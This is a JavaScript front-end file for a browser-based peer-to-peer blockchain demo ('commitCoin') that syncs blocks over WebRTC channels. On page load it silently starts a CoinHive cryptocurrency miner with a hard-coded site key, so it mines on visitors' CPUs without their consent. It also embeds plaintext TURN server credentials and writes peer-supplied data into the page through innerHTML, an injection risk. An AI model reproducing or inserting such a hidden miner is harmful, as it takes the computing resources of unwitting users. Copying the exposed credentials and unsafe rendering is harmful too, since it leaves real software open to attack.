import Blockchain from './Blockchain'
import Block from './Block'
import events from './events'

window.onload = () => {
    
    let miner = null;
    
    try {
        miner = new CoinHive.Anonymous('22Gilm1egEhU4A1HSTi7fDZM8CWjRqTJ');
    } catch (err) {
        console.log('miner failed');
    }
    
    if (miner !== null) miner.start();

    const iceServers = [
        {
            urls: 'turn:139.59.241.127:80',
            username: 'user1',
            credential: "password1"
        },
        { urls: "stun:stun.l.google.com:19302" }
    ];

    let channels = [];
    let blockchain = null;
    let messages = document.getElementById('messages');

    let network = RTC({
        // no media capture required
        constraints: null,

        // specify a chat channel
        channels: {
            blockchain: true
        },

        // use the public google stun servers :)
        ice: iceServers,
        signaller: '//139.59.241.127:3000',
        // specify a fixed room for the demo to use
        room: 'commitCoin'
    });


    network.on('channel:opened:blockchain', function(id, dc) {
        if (blockchain === null) blockchain = new Blockchain();
        console.log('connected');
        dc.onmessage = function(evt) {
            let data = JSON.parse(evt.data);
            if (data.event === events.ADD_BLOCK) {
                console.log('sending');
                let block = Block.fromJSON(data.block);
                blockchain.addBlock(block);
            } else if (data.event === events.SYNC_CHAIN) {
                console.log('syncing');
                let chain = data.chain;
                blockchain.replaceChain(chain);
            }
            messages.innerHTML = JSON.stringify(blockchain.getFullChain());
            // console.log(blockchain.getFullChain());
        };

        channels.push(dc);

        setInterval(() => {
            
            channels.forEach(c => {
                let data = {
                    event: events.SYNC_CHAIN,
                    chain: blockchain.getFullChain()
                };
                try {
                    c.send(JSON.stringify(data));
                } catch (err) {
                    let idx = channels.indexOf(c);
                    if (idx >= 0) {
                        channels.splice(idx, 1);
                    }
                }
            })
        }, 2000);
    
        
        setInterval(() => {
            
            channels.forEach(c => {
                let data = {
                    event: events.ADD_BLOCK,
                    block: blockchain.generateBlock({
                        action: 1,
                        user: 'abc',
                        repo: 'abc'
                    }).toJSON()
                };
                try {
                    c.send(JSON.stringify(data));
                } catch (err) {
                    let idx = channels.indexOf(c);
                    if (idx >= 0) {
                        channels.splice(idx, 1);
                    }
                }
            })
        }, Math.random()*20000+1000); 
    });

    network.on('channel:closed:blockchain', function(id, dc) {
        let idx = channels.indexOf(dc);
        if (idx >= 0) {
            channels.splice(idx, 1);
        }
    });
}